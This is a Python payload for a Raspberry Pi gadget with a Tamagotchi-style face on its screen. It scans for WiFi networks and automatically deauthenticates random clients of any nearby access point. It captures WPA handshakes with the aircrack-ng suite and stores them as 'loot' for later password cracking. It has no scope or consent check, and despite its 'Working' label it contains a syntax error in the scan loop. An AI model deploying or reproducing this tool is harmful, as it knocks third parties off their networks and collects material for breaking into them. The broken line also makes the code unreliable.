#!/usr/bin/env python3
"""
KTOx Payload – Pwnagotchi (Working)
====================================
Author: wickednull

- Uses airodump-ng and aireplay-ng (same as working deauth payload)
- Tamagotchi face on LCD
- Auto-targets APs with clients
- Saves handshakes to /root/KTOx/loot/Handshakes/

Controls:
  KEY3 – exit
"""

import os
import sys
import time
import threading
import subprocess
import random
import re
from datetime import datetime

# ----------------------------------------------------------------------
# Hardware & LCD
# ----------------------------------------------------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False
    print("KTOx hardware not found")
    sys.exit(1)

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
W, H = 128, 128

def font(size=9):
    try:
        return ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", size)
    except:
        return ImageFont.load_default()

f9 = font(9)
f11 = font(11)

# ----------------------------------------------------------------------
# Global state
# ----------------------------------------------------------------------
handshake_count = 0
ap_count = 0
client_count = 0
mood = "normal"
console_msg = "Starting..."
running = True
interface = "wlan0mon"  # will be set after monitor mode
attack_stop_event = threading.Event()
scanning = True

faces = {
    "normal":   "(◕‿‿◕)",
    "happy":    "(◕‿‿◕)",
    "attacking": "(⌐■_■)",
    "lost":     "(X\\/X)",
    "assoc":    "(°▃▃°)",
    "excited":  "(☼‿‿☼)",
    "missed":   "(☼/\\☼)",
    "searching": "(ಠ_↼ )"
}

def set_mood(new_mood):
    global mood
    mood = new_mood
    if new_mood in ("attacking", "assoc", "lost", "missed", "searching"):
        threading.Timer(2.0, lambda: set_mood("normal") if mood == new_mood else None).start()
    elif new_mood == "happy":
        threading.Timer(4.0, lambda: set_mood("normal") if mood == new_mood else None).start()

# ----------------------------------------------------------------------
# WiFi tools (same as working deauth payload)
# ----------------------------------------------------------------------
def run_cmd(cmd, timeout=None):
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        stdout, stderr = proc.communicate(timeout=timeout)
        return stdout.decode("utf-8") + stderr.decode("utf-8")
    except:
        return ""

def enable_monitor_mode():
    global interface
    # Kill interfering processes
    run_cmd("airmon-ng check kill")
    # Try to find a suitable interface (skip onboard if possible)
    for iface in ["wlan1", "wlan0"]:
        result = run_cmd(f"iwconfig {iface}")
        if "No such device" not in result and "IEEE 802.11" in result:
            # Check if it's onboard Broadcom (bad for monitor)
            if "brcmfmac" in run_cmd(f"ethtool -i {iface} 2>/dev/null"):
                continue  # skip onboard
            interface = iface
            break
    if not interface:
        interface = "wlan0"  # fallback
    
    # Enable monitor mode
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")
    # Also try airmon-ng
    run_cmd(f"airmon-ng start {interface}")
    # Check if monitor interface was created
    mon = f"{interface}mon"
    if os.path.exists(f"/sys/class/net/{mon}"):
        interface = mon
    return True

def disable_monitor_mode():
    run_cmd("airmon-ng stop wlan0mon 2>/dev/null")
    run_cmd("airmon-ng stop wlan1mon 2>/dev/null")
    run_cmd("ip link set wlan0 down 2>/dev/null")
    run_cmd("iw dev wlan0 set type managed 2>/dev/null")
    run_cmd("ip link set wlan0 up 2>/dev/null")
    run_cmd("systemctl restart NetworkManager")

def scan_networks(timeout=15):
    """Scan for APs and return list with BSSID, ESSID, channel, clients."""
    global ap_count
    tmp_file = "/tmp/pwnagotchi_scan"
    run_cmd(f"rm -f {tmp_file}*")
    proc = subprocess.Popen(
        f"timeout {timeout} airodump-ng --output-format csv -w {tmp_file} {interface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    proc.wait()
    time.sleep(1)
    
    networks = []
    csv_file = f"{tmp_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            content = f.read()
        # Split at "Station MAC" to get only AP section
        if "Station MAC" in content:
            content = content.split("Station MAC")[0]
        lines = content.strip().split("\n")
        # Find header
        header_idx = -1
        for i, line in enumerate lines:
            if "BSSID" in line and "ESSID" in line:
                header_idx = i
                break
        if header_idx >= 0:
            headers = [h.strip() for h in lines[header_idx].split(",")]
            try:
                col_bssid = headers.index("BSSID")
                col_ch = headers.index("channel")
                col_pwr = headers.index("PWR")
                col_essid = headers.index("ESSID")
            except ValueError:
                return []
            for line in lines[header_idx+1:]:
                if not line.strip() or "Station MAC" in line:
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) <= max(col_bssid, col_ch, col_pwr, col_essid):
                    continue
                bssid = parts[col_bssid]
                if not re.match(r"([0-9A-Fa-f]{2}:){5}", bssid):
                    continue
                essid = parts[col_essid]
                if essid and essid != "(not associated)":
                    ch = parts[col_ch]
                    pwr = parts[col_pwr]
                    try:
                        signal = int(pwr)
                    except:
                        signal = -90
                    networks.append({
                        "bssid": bssid,
                        "essid": essid,
                        "channel": ch,
                        "signal": signal
                    })
    ap_count = len(networks)
    return networks

def get_clients_for_ap(bssid, channel, timeout=10):
    """Run airodump on specific channel/BSSID and return client MACs."""
    tmp_file = f"/tmp/pwnagotchi_clients_{bssid.replace(':', '_')}"
    run_cmd(f"rm -f {tmp_file}*")
    proc = subprocess.Popen(
        f"timeout {timeout} airodump-ng -c {channel} --bssid {bssid} -w {tmp_file} {interface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    proc.wait()
    time.sleep(1)
    clients = []
    csv_file = f"{tmp_file}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, errors="ignore") as f:
            content = f.read()
        # Find station section
        if "Station MAC" in content:
            station_section = content.split("Station MAC")[1]
            lines = station_section.strip().split("\n")
            for line in lines:
                if not line.strip():
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 1 and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                    client_mac = parts[0]
                    clients.append(client_mac)
    return clients

def capture_handshake(bssid, essid, channel, client_mac):
    """Attempt to capture handshake by deauthing client."""
    global handshake_count, console_msg
    tmp_file = f"/tmp/pwnagotchi_hs_{bssid.replace(':', '_')}"
    run_cmd(f"rm -f {tmp_file}*")
    
    # Start airodump to capture
    proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {tmp_file} {interface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)
    
    # Send deauth
    set_mood("attacking")
    console_msg = f"Deauth {client_mac[-6:]}"
    run_cmd(f"aireplay-ng --deauth 10 -a {bssid} -c {client_mac} {interface}")
    time.sleep(3)
    
    # Stop airodump
    proc.terminate()
    time.sleep(1)
    
    # Check for handshake in .cap file
    cap_file = f"{tmp_file}-01.cap"
    if os.path.exists(cap_file):
        aircrack_out = run_cmd(f"aircrack-ng {cap_file} 2>/dev/null")
        if "handshake" in aircrack_out.lower():
            # Save the handshake
            loot_dir = "/root/KTOx/loot/Handshakes"
            os.makedirs(loot_dir, exist_ok=True)
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_essid = "".join(c for c in essid if c.isalnum() or c in "._-")[:30] or "unknown"
            dest = os.path.join(loot_dir, f"{safe_essid}_{bssid}_{ts}.cap")
            run_cmd(f"cp {cap_file} {dest}")
            with open(os.path.join(loot_dir, "handshake_log.txt"), "a") as log:
                log.write(f"{ts} | {essid} | {bssid} | {dest}\n")
            handshake_count += 1
            set_mood("happy")
            console_msg = f"HS! Total: {handshake_count}"
            return True
    set_mood("normal")
    return False

# ----------------------------------------------------------------------
# LCD drawing
# ----------------------------------------------------------------------
def draw_screen():
    img = Image.new("RGB", (W, H), "#0A0000")
    d = ImageDraw.Draw(img)
    d.rectangle((0, 0, W, 17), fill="#8B0000")
    d.text((4, 3), "PWNAGOTCHI", font=f9, fill="#FF3333")
    y = 20
    d.text((4, y), f"HS: {handshake_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"APs: {ap_count}", font=f9, fill="#FFBBBB"); y += 12
    d.text((4, y), f"CLI: {client_count}", font=f9, fill="#FFBBBB"); y += 12
    face_char = faces.get(mood, faces["normal"])
    try:
        face_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
    except:
        face_font = f11
    bbox = d.textbbox((0, 0), face_char, font=face_font)
    face_w = bbox[2] - bbox[0]
    face_x = (W - face_w) // 2
    d.text((face_x, 50), face_char, font=face_font, fill="#00FF00")
    d.text((4, H-30), console_msg[:23], font=f9, fill="#AAAAAA")
    d.rectangle((0, H-12, W, H), fill="#220000")
    d.text((4, H-10), "K3=Exit", font=f9, fill="#FF7777")
    LCD.LCD_ShowImage(img, 0, 0)

def wait_btn(timeout=0.1):
    start = time.time()
    while time.time() - start < timeout:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                time.sleep(0.05)
                return name
        time.sleep(0.02)
    return None

# ----------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------
def main():
    global running, interface, ap_count, client_count, console_msg
    
    # Enable monitor mode
    draw_screen()
    if not enable_monitor_mode():
        img = Image.new("RGB", (W, H), "black")
        d = ImageDraw.Draw(img)
        d.text((4, 40), "Monitor mode failed", font=f9, fill="red")
        d.text((4, 55), "Check interface", font=f9, fill="white")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return
    
    console_msg = f"Monitor: {interface}"
    set_mood("normal")
    draw_screen()
    time.sleep(1)
    
    # Main loop
    last_scan = 0
    networks = []
    attack_cooldown = 15
    last_attack = 0
    held = {}
    
    while running:
        now = time.time()
        
        # Scan every 10 seconds
        if now - last_scan > 10:
            last_scan = now
            console_msg = "Scanning..."
            draw_screen()
            networks = scan_networks(10)
            if networks:
                console_msg = f"Found {len(networks)} APs"
            else:
                console_msg = "No APs found"
            draw_screen()
        
        # Attack logic
        if networks and now - last_attack > attack_cooldown:
            # Find AP with clients
            for net in networks:
                bssid = net["bssid"]
                essid = net["essid"]
                channel = net["channel"]
                console_msg = f"Checking {essid[:12]}"
                draw_screen()
                clients = get_clients_for_ap(bssid, channel, timeout=8)
                client_count = len(clients)
                if clients:
                    # Pick random client
                    client = random.choice(clients)
                    console_msg = f"Target {essid[:8]}"
                    draw_screen()
                    set_mood("assoc")
                    draw_screen()
                    if capture_handshake(bssid, essid, channel, client):
                        last_attack = now
                        # After successful capture, wait longer before next attack
                        attack_cooldown = 30
                    else:
                        console_msg = "Missed handshake"
                        draw_screen()
                        time.sleep(1)
                    break
            # Reset cooldown if no targets
            attack_cooldown = 15
        
        # Button handling
        pressed = {n: GPIO.input(p)==0 for n,p in PINS.items()}
        for n, down in pressed.items():
            if down:
                if n not in held: held[n] = now
            else:
                held.pop(n, None)
        
        if pressed.get("KEY3") and (now - held.get("KEY3", now)) <= 0.05:
            break
        
        draw_screen()
        time.sleep(0.1)
    
    # Cleanup
    disable_monitor_mode()
    LCD.LCD_Clear()
    GPIO.cleanup()
    os._exit(0)

if __name__ == "__main__":
    main()
